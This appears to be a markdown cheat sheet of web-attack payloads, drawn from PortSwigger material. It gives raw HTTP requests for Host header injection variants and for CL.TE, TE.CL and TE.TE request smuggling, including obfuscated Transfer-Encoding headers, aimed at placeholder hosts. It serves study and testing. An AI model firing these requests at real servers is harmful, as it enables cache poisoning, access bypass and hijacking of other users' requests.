- [Host_Header_Injection](#Host_Header_Injection)
  - [Host_Header_Injection malicious port](#HHI_malicious_port)
  - [Host_Header_Injection malicious subdomain](#HHI_malicious_subdomain)
  - [Host_Header_Injection duplicate host headers](#HHI_duplicate_host_headers)
  - [Host Header Injection absolute URL](#HHI_absolute_URL)
  - [Host Header Injection line wrapping](HHI_line_wrapping)
  - [Host Header Injectio_inject_headers](#HHI_inject_headers)
  
- [Request Smuggling](#Request_smuggling)
  - [Request Smuggling Content-Length](#Content-Length)
  - [Request Smuggling Transfer-Encoding](#Transfer-Encoding)
  - [Request Smuggling Server behavior](#RS_server_behavior)
    - [CL.TE](#CL.TE)
    - [TE.CL](#TE.CL)
    - [TE.TE](#TE.TE)
    
# Host_Header_Injection

## HHI_malicious_port
```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```

## HHI_malicious_subdomain
```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```

## HHI_duplicate_host_headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

## HHI_absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

## HHI_line wrapping
```
GET /example HTTP/1.1
 Host: bad-stuff-here
Host: vulnerable-website.com
```

## HHI_inject_headers
```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here

example headers
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Request_smuggling

## Content-Length
The Content-Length header is straightforward: it specifies the length of the message body in bytes
```
POST /search HTTP/1.1
Host: my-vulnerablewebsite.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
## Transfer-Encoding
Message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero.
```
POST /search HTTP/1.1
Host: my-vulnerablewebsite.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```
## RS_server_behavior

- CL.TE: The front-end server uses the Content-Length header, and the backend server uses Transfer-Encoding.
- TE.CL: the front-end server uses the Transfer-Encoding header, and the backend server uses the Content-Length header.
- TE.TE: The front-end and back-end servers support the Transfer-Encoding header, but one of the servers may be forced to not process it if it has been obfuscated.

### CL.TE
The front-end server processes the Content-Length header and determines that the request body is 13 bytes long, up to the end of SMUGGLED. This request is forwarded on to the back-end server. The back-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The following bytes, SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
```
POST / HTTP/1.1
Host: my-vulnerablewebsite.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
### TE.CL
The front-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following SMUGGLED. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.
The back-end server processes the Content-Length header and determines that the request body is 3 bytes long, up to the start of the line following 8. The following bytes, starting with SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.
```
POST / HTTP/1.1
Host: my-vulnerablewebsite.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
In Burp repeater 'Update Content-Length' option is unchecked.You need to include the ending sequence \ r \ n \ r \ n after the last 0.

### TE.TE
There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```
To uncover a TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

------------------------------------------------------------------------------------------------------------------------------------------------------------------
References
- https://portswigger.net
